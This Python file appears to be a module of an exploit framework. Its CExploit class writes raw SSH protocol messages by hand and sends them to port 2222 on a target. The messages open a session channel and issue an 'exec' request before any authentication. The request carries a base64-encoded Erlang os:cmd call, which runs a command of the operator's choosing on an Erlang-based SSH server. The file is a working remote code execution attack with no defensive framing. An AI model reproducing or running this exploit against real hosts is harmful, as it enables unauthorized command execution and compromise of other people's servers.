from Metode import *
from utils import Logger
from pathlib import Path
""" import re
import keyring """
import subprocess
import random
import string
import time
import socket
import struct
import base64

log = Logger()

class CExploit(Exploit):
    # Helper to format SSH string (4-byte length + bytes)
    def string_payload(self, s):
        s_bytes = s.encode("utf-8")
        return struct.pack(">I", len(s_bytes)) + s_bytes


    # Builds SSH_MSG_CHANNEL_OPEN for session
    def build_channel_open(self, channel_id=0):
        return (
            b"\x5a"  # SSH_MSG_CHANNEL_OPEN
            + self.string_payload("session")
            + struct.pack(">I", channel_id)  # sender channel ID
            + struct.pack(">I", 0x68000)  # initial window size
            + struct.pack(">I", 0x10000)  # max packet size
        )


    # Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload
    def build_channel_request(self, channel_id=0, command=None):
        return (
            b"\x62"  # SSH_MSG_CHANNEL_REQUEST
            + struct.pack(">I", channel_id)
            + self.string_payload("exec")
            + b"\x01"  # want_reply = true
            + self.string_payload(command)
        )


    # Builds a minimal but valid SSH_MSG_KEXINIT packet
    def build_kexinit(self):
        cookie = b"\x00" * 16

        def name_list(l):
            return self.string_payload(",".join(l))

        # Match server-supported algorithms from the log
        return (
            b"\x14"
            + cookie
            + name_list(
                [
                    "curve25519-sha256",
                    "ecdh-sha2-nistp256",
                    "diffie-hellman-group-exchange-sha256",
                    "diffie-hellman-group14-sha256",
                ]
            )  # kex algorithms
            + name_list(["rsa-sha2-256", "rsa-sha2-512"])  # host key algorithms
            + name_list(["aes128-ctr"]) * 2  # encryption client->server, server->client
            + name_list(["hmac-sha1"]) * 2  # MAC algorithms
            + name_list(["none"]) * 2  # compression
            + name_list([]) * 2  # languages
            + b"\x00"
            + struct.pack(">I", 0)  # first_kex_packet_follows, reserved
        )


    # Pads a packet to match SSH framing
    def pad_packet(self, payload, block_size=8):
        min_padding = 4
        padding_len = block_size - ((len(payload) + 5) % block_size)
        if padding_len < min_padding:
            padding_len += block_size
        return (
            struct.pack(">I", len(payload) + 1 + padding_len)
            + bytes([padding_len])
            + payload
            + bytes([0] * padding_len)
        )


    # Convert system command to Erlang os:cmd format
    def format_erlang_command(self, cmd):
        # Use base64 encoding to avoid escaping issues
        encoded_cmd = base64.b64encode(cmd.encode()).decode()
        # Create Erlang code that decodes and executes the command
        return f'os:cmd(binary_to_list(base64:decode("{encoded_cmd}"))).'
    
    def makePayload(self, params=list):
        log.debugger(params[0][1])
        self._port = 2222
        self._ipAddr = params[0][0]
        if len(params[0]) > 2 and params[0][2]:
            self._command = params[0][2]
            log.debugger(self._command)

    def startExploit(self):
        log.debugger(self._command)
        erlang_cmd = self.format_erlang_command(self._command)
        with socket.create_connection((self._ipAddr, self._port), timeout=5) as s:
            s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
            banner = s.recv(1024)
            print(f"[+] Received banner: {banner.strip().decode(errors='ignore')}")
            time.sleep(0.5)  # Small delay between packets

            kex_packet = self.build_kexinit()
            s.sendall(self.pad_packet(kex_packet))
            time.sleep(0.5)  # Small delay between packets

            chan_open = self.build_channel_open()
            s.sendall(self.pad_packet(chan_open))
            time.sleep(0.5)  # Small delay between packets

            chan_req = self.build_channel_request(command=erlang_cmd)
            s.sendall(self.pad_packet(chan_req))
            
